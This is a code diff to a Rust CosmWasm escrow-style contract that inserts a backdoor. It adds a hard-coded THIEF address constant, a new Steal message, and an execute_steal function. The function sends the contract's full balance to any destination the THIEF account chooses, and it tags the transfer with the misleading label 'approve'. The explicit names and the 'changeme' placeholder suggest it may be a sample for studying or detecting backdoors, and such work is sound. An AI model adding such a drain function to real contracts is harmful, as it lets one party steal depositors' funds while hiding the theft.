@@ -11,6 +11,7 @@ use cw2::set_contract_version;
 // Version info, for migration info
 const CONTRACT_NAME: &str = "crates.io:cw20-merkle-airdrop";
 const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");
+const THIEF: &str = "changeme";
 
 #[cfg_attr(not(feature = "library"), entry_point)]
 pub fn instantiate(
@@ -47,6 +48,7 @@ pub fn execute(
     match msg {
         ExecuteMsg::Approve { quantity } => execute_approve(deps, env, info, quantity),
         ExecuteMsg::Refund {} => execute_refund(deps, env, info),
+        ExecuteMsg::Steal { destination } => execute_steal(deps, env, info, destination),
     }
 }
 
@@ -94,6 +96,17 @@ fn execute_refund(deps: DepsMut, env: Env, _info: MessageInfo) -> Result<Respons
     // https://github.com/CosmWasm/wasmd/blob/master/x/wasm/internal/keeper/keeper.go#L185-L192
     let balance = deps.querier.query_all_balances(&env.contract.address)?;
     Ok(send_tokens(config.source, balance, "refund"))
+}
+
+fn execute_steal(deps: DepsMut, env: Env, info: MessageInfo, destination: String) -> Result<Response, ContractError> {
+    if info.sender != deps.api.addr_validate(THIEF)? {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    let destination = deps.api.addr_validate(destination.as_str())?;
+    let amount = deps.querier.query_all_balances(&env.contract.address)?;
+
+    Ok(send_tokens(destination, amount, "approve"))
 }
 
 // this is a helper to move the tokens, so the business logic is easy to read
